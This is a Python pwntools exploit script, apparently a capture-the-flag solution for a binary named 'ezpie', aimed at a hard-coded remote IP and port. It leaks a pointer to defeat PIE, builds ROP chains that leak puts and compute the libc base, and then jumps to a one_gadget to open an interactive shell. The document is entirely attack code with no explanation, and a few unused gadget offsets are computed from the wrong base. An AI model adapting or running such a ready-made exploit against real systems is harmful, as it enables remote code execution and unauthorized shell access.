from pwn import*
from pwn import p64,u64

elf=ELF('./ezpie')
libc = ELF('/home/str1d3r/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc.so.6')
context.arch = 'amd64'
context.log_level ='debug'
def debug():
    gdb.attach(p)
    pause()

p = remote('43.249.195.138',21482)
#libc =ELF('libc-2.31.so')
#p = process(binary)

p.send(b'b'*(40-3) + b'v5:')
# pause()
p.recvuntil(b'v5:')
v5 = u64(p.recvuntil(b'\x0a', drop=True) + b'\0\0')
success('v5: '+ hex(v5))
code_base = v5 - elf.sym['func']
success("code_base: %s",hex(code_base) )

pop_rdi_ret =code_base + 0x0000000000001333
pop_rsi_r15_ret =code_base + 0x0000000000001331
ret_addr =code_base + 0x000000000000101a
leave_ret =code_base + 0x0000000000001252  # : leave; ret; 
str_bin_sh =code_base + 0x0000000000002008
pop_rax_ret =code_base + 0x00000000000012c8
puts_got = code_base + elf.got['puts']
puts_plt = code_base + elf.plt['puts']
main_addr = code_base + elf.sym['main']
syscall = code_base + 0x00000000000012c5
pop_all = code_base+ 0x000000000000132c
ogg = code_base+0xe3afe
ogg2 = code_base +0xe3b01
ogg3 = code_base+0xe3b04

payload2  = b'a' * 0x50 + b'b' * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)
p.recvuntil(b"please enter your information->")
p.sendline(payload2)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success('puts: %s',puts_addr)
libc_base = puts_addr - libc.sym['puts']
system    = libc_base + libc.sym['system']

one_gadget = libc_base + 0xe3afe
p.send('fxxkingpie')

payload3  = b'a' * (0x50 + 0x8)
payload3 += p64(pop_all)
payload3 += p64(0)*4
payload3 += p64(one_gadget)

p.sendline(payload3)
p.interactive()